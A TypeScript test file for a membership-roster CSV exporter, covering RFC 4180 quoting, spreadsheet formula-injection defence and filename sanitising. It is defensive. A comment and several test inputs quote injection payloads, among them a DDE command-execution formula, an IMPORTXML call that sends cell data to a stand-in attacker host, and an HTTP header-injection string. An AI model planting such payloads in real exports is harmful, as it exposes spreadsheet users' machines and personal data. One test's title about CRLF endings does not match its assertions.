import { describe, expect, it } from "bun:test";
import {
  MEMBER_CSV_COLUMNS,
  csvAttachmentFilename,
  escapeCsvField,
  memberCsvHeaderLine,
  memberCsvLine,
} from "./member-csv";

/** A roster row with everything present, for tests that vary one field. */
const ROW = {
  memberId: "3f1c9e0a-1111-4222-8333-444455556666",
  name: "Siti Aminah",
  whatsappNumber: "+6281234567890",
  tierName: "Basic",
  status: "active",
  joinedAt: new Date("2026-08-01T03:04:05.000Z"),
  nextBillingDate: "2026-09-01",
};

describe("escapeCsvField — RFC 4180", () => {
  it("leaves an ordinary value alone", () => {
    expect(escapeCsvField("Siti Aminah")).toBe("Siti Aminah");
  });

  it("quotes a value containing a COMMA", () => {
    // Unquoted, this would split one member across two columns and shift every
    // later column of that row — silently, and only for that member.
    expect(escapeCsvField("Aminah, Siti")).toBe('"Aminah, Siti"');
  });

  it("quotes a value containing a DOUBLE QUOTE, and doubles the quote", () => {
    // RFC 4180 §2.7. `Siti "Ami"` written as `"Siti "Ami""` ends the field early
    // and the rest of the name becomes a parse error or a new column.
    expect(escapeCsvField('Siti "Ami"')).toBe('"Siti ""Ami"""');
  });

  it("quotes a value containing a NEWLINE, keeping the newline", () => {
    // Unquoted, a newline in a display name turns one member into two rows — the
    // second of them malformed — which is how a roster of 40 reads as 41.
    expect(escapeCsvField("Siti\nAminah")).toBe('"Siti\nAminah"');
    expect(escapeCsvField("Siti\r\nAminah")).toBe('"Siti\r\nAminah"');
    expect(escapeCsvField("Siti\rAminah")).toBe('"Siti\rAminah"');
  });

  it("quotes a value with leading or trailing spaces, so they survive", () => {
    expect(escapeCsvField("  Siti  ")).toBe('"  Siti  "');
  });

  it("renders an empty value as an empty field", () => {
    expect(escapeCsvField("")).toBe("");
  });
});

describe("escapeCsvField — formula injection", () => {
  /**
   * A MEMBER TYPES THEIR OWN DISPLAY NAME AT CHECKOUT, so this is untrusted input
   * arriving in a creator's spreadsheet. Excel and Google Sheets EXECUTE a cell
   * beginning with any of these, so `=HYPERLINK(...)`, `+cmd|'/c calc'!A1` and
   * `=IMPORTXML("http://attacker/?"&A1)` are all live attacks on the creator's
   * machine and on the rest of their roster — including the WhatsApp numbers in the
   * next column.
   */
  const FORMULA_LEADERS = ["=", "+", "-", "@", "\t", "\r"];

  for (const leader of FORMULA_LEADERS) {
    it(`neutralises a value beginning with ${JSON.stringify(leader)}`, () => {
      const escaped = escapeCsvField(`${leader}HYPERLINK("http://evil.test","klik")`);
      // The dangerous character must no longer be the first thing in the cell.
      expect(escaped.startsWith(leader)).toBe(false);
      expect(escaped.startsWith('"')).toBe(true);
      // A leading apostrophe INSIDE the quoted field is what makes a spreadsheet
      // treat the rest as text.
      expect(escaped.slice(0, 2)).toBe("\"'");
      // And the value itself is still legible to a person reading the file.
      expect(escaped).toContain("HYPERLINK");
    });
  }

  it("does not mangle a value that merely CONTAINS one of those characters", () => {
    // `Siti-Aminah` and `a@b` are ordinary names. Escaping them would corrupt every
    // hyphenated name in Indonesia to no purpose.
    expect(escapeCsvField("Siti-Aminah")).toBe("Siti-Aminah");
    expect(escapeCsvField("siti@example.com")).toBe("siti@example.com");
    expect(escapeCsvField("1+1")).toBe("1+1");
  });

  it("neutralises a formula that also needs RFC 4180 quoting", () => {
    // Both rules at once, which is the case a single-rule implementation gets wrong:
    // the comma has to be quoted AND the `=` has to be defused.
    const escaped = escapeCsvField('=SUM(A1,A2)"');
    expect(escaped.startsWith("\"'=")).toBe(true);
    expect(escaped).toContain('""'); // the inner double quote, doubled
    expect(escaped.endsWith('"')).toBe(true);
  });

  it("neutralises a formula hidden behind a leading apostrophe-looking character", () => {
    // `'=1+1` already starts with an apostrophe, so it is text in a spreadsheet and
    // needs no second one — but it must still be quoted, and it must not gain a
    // SECOND apostrophe that a reader would see as part of the name.
    const escaped = escapeCsvField("'=1+1");
    expect(escaped).not.toContain("''");
  });
});

describe("the roster CSV layout", () => {
  it("has a header naming every column, in Indonesian", () => {
    const header = memberCsvHeaderLine();
    expect(header.split(",")).toHaveLength(MEMBER_CSV_COLUMNS.length);
    expect(header).toContain("Nama");
    expect(header).toContain("Nomor WhatsApp");
    expect(header).toContain("Paket");
    expect(header).toContain("Status");
  });

  it("renders a row with the same number of columns as the header", () => {
    expect(memberCsvLine(ROW).split(",")).toHaveLength(MEMBER_CSV_COLUMNS.length);
  });

  it("keeps a member whose name contains a comma on ONE row and in the right column", () => {
    const line = memberCsvLine({ ...ROW, name: "Aminah, Siti" });
    expect(line).toContain('"Aminah, Siti"');
    expect(line.split("\n")).toHaveLength(1);
    // The WhatsApp number must still be in the column after the name, which is the
    // thing an unquoted comma silently breaks. (The number carries the formula
    // prefix — see the next test for why that is right rather than a bug.)
    //
    // Asserted on the line's prefix rather than by splitting on commas, because
    // splitting on commas is exactly the mistake the quoting exists to survive: a
    // naive `split(",")` on this line yields `"Aminah` and ` Siti"`.
    expect(line.startsWith("\"Aminah, Siti\",\"'+6281234567890\",")).toBe(true);
  });

  it("defuses the WhatsApp number too, because `+62…` is a formula in Excel", () => {
    // THE RULE HAS NO PER-COLUMN EXEMPTIONS, and this is the column that tempts one.
    // A cell of `+6281234567890` is a formula to Excel: it evaluates to the NUMBER
    // 6281234567890 and renders as `6.28E+12`, so the creator cannot read, copy or
    // dial it. The apostrophe keeps the digits exactly as stored.
    //
    // Uniformity is also the security argument. An exemption for "the column we
    // control" is how the one unescaped column becomes the injection point after
    // somebody later changes what fills it.
    const line = memberCsvLine(ROW);
    expect(line).toContain("\"'+6281234567890\"");
    expect(line).not.toContain(",+6281234567890,");
  });

  it("keeps a member whose name is a formula from executing", () => {
    const line = memberCsvLine({ ...ROW, name: "=1+1" });
    expect(line).toContain("\"'=1+1\"");
  });

  it("renders a missing name as an empty field rather than the word null", () => {
    // `member.name` is nullable — checkout can create a member without one. A CSV
    // that says "null" makes a creator think that is what they typed.
    const line = memberCsvLine({ ...ROW, name: null });
    expect(line).not.toContain("null");
    expect(line.startsWith(",")).toBe(true);
  });

  it("renders a missing next billing date as an empty field", () => {
    const line = memberCsvLine({ ...ROW, nextBillingDate: null });
    expect(line).not.toContain("null");
    expect(line.endsWith(",")).toBe(true);
  });

  it("renders joinedAt as a date a spreadsheet and a person both read", () => {
    expect(memberCsvLine(ROW)).toContain("2026-08-01");
  });

  it("ends every line with CRLF, per RFC 4180", () => {
    expect(memberCsvHeaderLine().endsWith("\r\n")).toBe(false);
    // The lines themselves carry no terminator — the writer joins them — so that a
    // caller cannot accidentally emit a trailing blank record.
    expect(memberCsvLine(ROW)).not.toContain("\r\n");
  });
});

describe("csvAttachmentFilename", () => {
  it("includes the community slug, so two exports are tellable apart", () => {
    expect(csvAttachmentFilename("kelas-budi")).toContain("kelas-budi");
    expect(csvAttachmentFilename("kelas-budi").endsWith(".csv")).toBe(true);
  });

  it("strips anything that could break the Content-Disposition header", () => {
    // Slugs are `[a-z0-9-]` by construction (domain/slug.ts), so this is defence in
    // depth — but a header value is exactly the wrong place to trust a construction
    // argument. A quote or a newline here is header injection.
    const filename = csvAttachmentFilename('evil"\r\nSet-Cookie: a=b');
    expect(filename).not.toContain('"');
    expect(filename).not.toContain("\r");
    expect(filename).not.toContain("\n");
  });

  it("still produces a usable filename for an empty or all-illegal slug", () => {
    expect(csvAttachmentFilename("").endsWith(".csv")).toBe(true);
    expect(csvAttachmentFilename("").length).toBeGreaterThan(4);
  });
});
